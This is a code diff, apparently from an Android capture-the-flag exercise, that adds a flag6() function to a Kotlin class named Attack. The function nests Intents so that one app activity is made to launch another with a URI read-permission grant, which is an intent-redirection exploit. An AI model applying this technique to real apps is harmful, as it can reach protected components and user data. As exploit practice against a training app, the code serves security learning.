@@ -97,4 +97,30 @@ class Attack(private val context: Context) {
 		Utils.dumpIntent(context, intent, title = "Flag 5 Intent")
 		context.startActivity(intent)
 	}
+
+	fun flag6() {
+		val activityPath = "$packageName.activities.Flag5Activity"
+		val newActivityPath = "$packageName.activities.Flag6Activity"
+
+		val intent3 = Intent().apply {
+			setClassName(packageName, newActivityPath)
+			putExtra("reason", "next")
+			flags = Intent.FLAG_GRANT_READ_URI_PERMISSION
+		}
+
+		val intent2 = Intent().apply {
+			setClassName(packageName, activityPath)
+			putExtra("return", 42)
+			putExtra("nextIntent", intent3)
+		}
+
+		val intent = Intent().apply {
+			setClassName(packageName, activityPath)
+			putExtra("android.intent.extra.INTENT", intent2)
+			flags = Intent.FLAG_ACTIVITY_NEW_TASK
+		}
+
+		Utils.dumpIntent(context, intent, title = "Flag 5 Intent")
+		context.startActivity(intent)
+	}
 }
